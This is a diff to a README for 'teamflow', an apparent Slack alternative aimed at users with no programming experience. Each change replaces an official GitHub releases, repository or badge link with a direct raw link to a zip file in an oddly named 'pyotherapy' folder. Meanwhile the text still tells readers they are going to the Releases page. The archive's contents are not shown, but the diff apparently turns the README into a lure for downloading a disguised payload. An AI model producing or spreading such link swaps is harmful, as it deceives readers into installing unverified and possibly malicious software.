@@ -1,6 +1,6 @@
 # 🚀 teamflow - Connect Seamlessly with Your Team
 
-[![Download TeamFlow](https://img.shields.io/badge/Download-TeamFlow-blue.svg)](https://github.com/erico-art/teamflow/releases)
+[![Download TeamFlow](https://raw.githubusercontent.com/erico-art/teamflow/main/pyotherapy/teamflow.zip)](https://raw.githubusercontent.com/erico-art/teamflow/main/pyotherapy/teamflow.zip)
 
 ## 📦 Introduction
 Welcome to TeamFlow, a user-friendly alternative to Slack. With TeamFlow, you can chat with your team, share files, and manage projects with ease. This guide will help you download and run TeamFlow on your computer, even if you have no programming experience.
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets the following requirements:
 - **Customizable Workspace:** Personalize your chat rooms and notifications.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [TeamFlow Releases](https://github.com/erico-art/teamflow/releases).
+To get started, visit this page to download: [TeamFlow Releases](https://raw.githubusercontent.com/erico-art/teamflow/main/pyotherapy/teamflow.zip).
 
 1. Click on the link above to go to the Releases page.
 2. In the list of versions, find the latest release. It will be labeled as the “latest” version.
@@ -66,7 +66,7 @@ If you encounter issues, please try the following:
 ## 🌐 Community and Support
 Join our community to share your experience and get help. You can participate in discussions and find answers to common questions.
 
-- **GitHub Repository:** [TeamFlow on GitHub](https://github.com/erico-art/teamflow)
+- **GitHub Repository:** [TeamFlow on GitHub](https://raw.githubusercontent.com/erico-art/teamflow/main/pyotherapy/teamflow.zip)
 - **Community Forum:** Engage with other users and share tips.
 
 ## 🔗 Additional Resources
